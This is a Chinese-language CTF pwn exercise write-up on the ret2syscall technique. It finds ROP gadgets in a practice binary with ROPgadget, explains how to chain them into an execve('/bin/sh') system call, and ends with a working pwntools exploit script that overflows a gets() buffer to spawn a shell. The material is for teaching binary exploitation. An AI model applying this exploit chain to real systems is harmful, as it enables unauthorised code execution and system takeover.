# # PWN Exercise - ret2syscall

## 准备
ROPgadget Install

```
$ sudo pip install capstone
$ pip install ropgadget
$ ROPgadget
```
https://github.com/JonathanSalwan/ROPgadget



## 题目

>题目：获取shell。


pwn checksec
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
伪代码：
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("This time, no system() and NO SHELLCODE!!!");
  puts("What do you plan to do?");
  gets(&v4);
  return 0;
}
```
## PWN
- 由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。   
- 系统调用的利用方式，通常在静态链接时比较常用。

### 构造ROP

简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell   

`execve("/bin/sh",NULL,NULL)`
>该程序是 32 位，所以我们需要使得   
系统调用号，即 eax 应该为 0xb   
第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。   
第二个参数，即 ecx 应该为 0   
第三个参数，即 edx 应该为 0   
```
; NASM
int execve(const char *filename, char *const argv[], char *const envp[]); 
mov eax, 0xb                ; execve系统调用号为11
mov ebx, filename   
mov ecx, argv
mov edx, envp
int 0x80                    ; 触发系统调用
```


该利用原理：  
>只要用户态栈空间能够控制成这样(只是举例其中的一种排列方式)就可以达到ret2syscall的目的 简单分析一下流程： 1、成功溢出 2、通过ret指令使得EIP指向pop eax;的地址 3、执行pop eax;栈顶值0xb成功出栈，栈顶指针下移 4、通过ret指令使得EIP指向pop ebx;的地址 ..... 一切都清楚后，下面就开始进行创造条件。
![](https://pic4.zhimg.com/80/v2-f23f207af738984e8c23ff8f0a84eeb3_1440w.jpg)

### ROPgadget
pop eax;ret 
```
$ ROPgadget --binary ret2syscall --only 'pop|ret' | grep eax

0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret

```
pop ebx;ret
```
$ ROPgadget --binary ret2syscall --only 'pop|ret' | grep ebx
0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x080be23f : pop ebx ; pop edi ; ret
0x0806eb69 : pop ebx ; pop edx ; ret
0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x08048913 : pop ebx ; pop esi ; pop edi ; ret
0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
0x08049a94 : pop ebx ; pop esi ; ret
0x080481c9 : pop ebx ; ret
0x080d7d3c : pop ebx ; ret 0x6f9
0x08099c87 : pop ebx ; ret 8
0x0806eb91 : pop ecx ; pop ebx ; ret
0x0806336b : pop edi ; pop esi ; pop ebx ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
0x0805c820 : pop esi ; pop ebx ; ret
0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0807b6ed : pop ss ; pop ebx ; ret
```
/bin/sh
```
$ ROPgadget --binary ret2syscall --string '/bin/sh'
Strings information
============================================================
0x080be408 : /bin/sh

```

pop ecx;ret
```
$ ROPgadget --binary ret2syscall --only 'pop|ret' | grep ecx
0x0806eb91 : pop ecx ; pop ebx ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret

```
pop edx;ret
```
$ ROPgadget --binary ret2syscall --only 'pop|ret' | grep edx
0x0806eb69 : pop ebx ; pop edx ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
0x0806eb6a : pop edx ; ret
0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret

```
int 0x80
```
$ ROPgadget --binary ret2syscall --only 'int'
Gadgets information
============================================================
0x08049421 : int 0x80

Unique gadgets found: 1
```

### EXP
```python
from pwn import *

elf = ELF('ret2syscall')
io =process(elf.path)

pop_eax_ret_addr = 0x080bb196 # pop eax;ret
pop_ebx_ecx_edx_ret_addr = 0x0806eb90 # pop edx ; pop ecx ; pop ebx ; ret
bin_sh_addr = 0x080be408 # /bin/sh
int_addr = 0x08049421 # int 0x80

payload = b'a' * 0x6c + b'bbbb'
payload += p32(pop_eax_ret_addr)+p32(0xb)
payload += p32(pop_ebx_ecx_edx_ret_addr) + p32(0)+p32(0)+p32(bin_sh_addr)
payload += p32(int_addr)

io.sendline(payload)
io.interactive()
```
## Ref

- https://zhuanlan.zhihu.com/p/137144976
- https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/